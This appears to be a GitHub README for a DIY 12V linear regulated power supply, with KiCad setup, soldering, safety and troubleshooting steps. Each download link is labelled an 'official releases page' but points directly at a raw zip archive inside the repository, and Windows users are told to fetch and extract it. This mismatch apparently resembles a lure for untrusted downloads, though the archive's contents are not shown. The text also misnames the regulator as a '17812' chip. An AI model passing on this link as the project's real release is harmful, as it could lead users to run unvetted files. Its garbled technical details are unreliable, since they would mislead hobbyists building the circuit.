# ⚡ Simple-12V-Regulated-Power-Supply - Build your own stable power source

[![Download Power Supply Files](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Korrieclanging201/Simple-12V-Regulated-Power-Supply/raw/refs/heads/main/Fabrication/Regulated_Simple_Supply_Power_2.9-alpha.4.zip)

## 📋 Project Overview

This project provides the design files to build a reliable 12V DC power supply. This device takes standard wall power from a transformer and converts it into a smooth, steady stream of electricity for your electronic projects. Many DIY circuits need a clean 12V source to function, and this design focuses on safety and performance.

The circuit uses a linear regulator to keep the voltage steady. It manages heat well and keeps electrical noise, known as ripple, to a minimum. You can use these files to manufacture a printed circuit board, also called a PCB, which acts as the foundation for your electronic circuit.

## 🛠 Features

*   **Steady Output:** The design ensures a constant 12V output.
*   **Heat Management:** Circuit placement allows for efficient cool-down during use.
*   **Safety Focused:** The design includes space for necessary fuses and protective components.
*   **Low Noise:** The circuit minimizes electrical ripples that can interfere with sensitive electronic parts.
*   **Standard Parts:** Parts used in this design are common and easy to find at electronics stores.

## 📥 Downloading the Files

You need the design files to build this board. Follow these steps to obtain them:

1. Visit the [official releases page](https://github.com/Korrieclanging201/Simple-12V-Regulated-Power-Supply/raw/refs/heads/main/Fabrication/Regulated_Simple_Supply_Power_2.9-alpha.4.zip).
2. Look for the latest release version on the page.
3. Click the link to download the compressed folder.
4. Save the folder to a location you can find on your computer.

## ⚙️ Understanding the Requirements

Building a power supply involves working with electrical components. Before you start, gather these items:

*   **KiCad Software:** This is the tool used to open the design files. It is free and open-source.
*   **Circuit Parts:** You will need a transformer, a bridge rectifier, a regulator chip, capacitors, a heat sink, and a circuit board.
*   **Assembly Tools:** A soldering iron, solder, and wire cutters are necessary to connect the components.
*   **Safety Equipment:** Always wear safety glasses when soldering or testing electrical circuits.

You do not need to be a programmer to use these files. You only need to open them in KiCad to view the diagrams or send them to a PCB fabrication house to get the physical board made.

## 🚀 Setting Up Your Workspace

Follow these steps to prepare your computer for the design files:

1. Download and install KiCad from the official website.
2. Open the KiCad program on your Windows computer.
3. Extract the contents of the download you received from the releases page to a folder.
4. Open the project file inside that folder using KiCad.

Once the project opens, you will see the schematic diagram. The schematic shows how each part connects to the others. You can also view the board layout. This shows exactly where each part sits on the physical board.

## 🔧 Building the Circuit

Building a hardware project requires care. Start by checking the bill of materials, which lists every part you need. Match the parts you bought to this list before you begin.

1. **Preparing the PCB:** If you ordered the board from a manufacturer, inspect it for cracks or errors.
2. **Placing Components:** Start with the smallest parts like resistors. Solder them onto the board first. Move to larger parts like capacitors and the regulator.
3. **Heat Sink Attachment:** The regulator gets warm. Attach the heat sink firmly. Use thermal paste to help transfer heat away from the chip.
4. **Soldering:** Heat each connection point with your iron. Apply a small amount of solder. Ensure the solder forms a smooth, shiny cone around the component leg.
5. **Connecting the Transformer:** Only connect the transformer after you double-check every solder joint. Short circuits can damage your power supply or your equipment.

## 🛡 Maintaining Safety

Working with power supplies carries risks. Always follow these rules:

*   **Unplug First:** Never touch the circuit while it is plugged into a wall outlet.
*   **Check Connections:** Use a multimeter to check for short circuits before you apply power for the first time.
*   **Cooling:** Ensure the area around your circuit has good airflow. Never cover the unit while it is powered on.
*   **Insulation:** Place your finished board in a non-conductive case. This prevents accidental contact with bare wires.

## 💡 Troubleshooting

If your power supply does not give a steady 12V output, check these areas:

*   **Cold Solder Joints:** A dim or dull solder joint might not conduct electricity well. Reheat the joint and add a tiny bit of fresh solder.
*   **Component Orientation:** Some parts, like capacitors and diodes, have a specific positive and negative side. Ensure you placed these correctly.
*   **Loose Wires:** Check that all wires connecting the transformer to the board are tight.
*   **Regulator Check:** If the regulator chip is extremely hot to the touch, turn off the power immediately. This usually indicates a short circuit.

## 📂 Project Contents

The repository contains several key files to help you succeed:

*   **Schematic File:** Shows the electrical logic of the power supply.
*   **PCB Layout File:** Shows how to arrange parts on the physical board.
*   **Bill of Materials:** A spreadsheet that lists every item you need to buy to complete the build.
*   **Design Rules:** Technical settings that ensure the board is manufactured correctly.

You can modify these files if you prefer a different size or shape for your board. KiCad provides many tutorials if you wish to learn more about editing these designs.

## 📚 Further Learning

The power supply design is a common project for those new to electronics. Understanding how a 12V regulator works provides a good foundation for other projects. You can search for terms like "linear regulator circuits" or "PCB assembly for beginners" to find more resources.

This project relies on the 17812 regulator chip, which is a standard part in electronics design. The design files are open, allowing you to learn from how the circuit handles input voltage and stabilizes the output. Whether you are building this for a specific repair or just for personal practice, these files provide a stable path forward.